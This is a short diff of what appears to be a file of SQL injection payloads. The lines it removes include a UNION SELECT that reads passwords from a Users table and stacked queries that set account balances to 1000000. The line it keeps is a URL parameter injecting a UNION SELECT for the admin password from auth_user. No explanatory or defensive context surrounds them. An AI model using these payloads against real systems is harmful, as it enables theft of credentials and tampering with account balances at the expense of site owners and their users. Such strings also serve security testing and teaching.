@@ -1,7 +1,1 @@
-"5') UNION SELECT password FROM Users WHERE admin LIKE '1"
-
-0; UPDATE Account SET balance = 1000000 WHERE user_id = 1
-
-'0; UPDATE afterlog_account SET balance = 1000000 WHERE user_id = 2'
-
 ?from=0' UNION SELECT password FROM auth_user WHERE username LIKE 'admin
